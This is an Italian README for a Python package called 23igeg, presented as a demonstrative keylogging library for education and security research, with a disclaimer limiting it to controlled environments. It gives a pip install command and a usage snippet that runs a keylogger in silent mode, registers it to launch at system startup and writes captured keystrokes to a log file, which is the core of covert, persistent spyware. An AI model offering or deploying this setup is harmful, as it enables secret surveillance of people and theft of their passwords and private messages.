# 23igeg

**23igeg** è una libreria Python dimostrativa per il keylogging, creata a scopo informativo e per la ricerca accademica sulla sicurezza informatica.

⚠️ **Attenzione**: questo software è destinato esclusivamente all'uso in ambienti controllati e a fini didattici.

## Installazione

```bash
pip install 23igeg
```

## Uso base

```python
from igeg.logger import KeyLogger

logger = KeyLogger(logfile="log.txt", silent=True)
logger.add_to_startup()
logger.start()
```
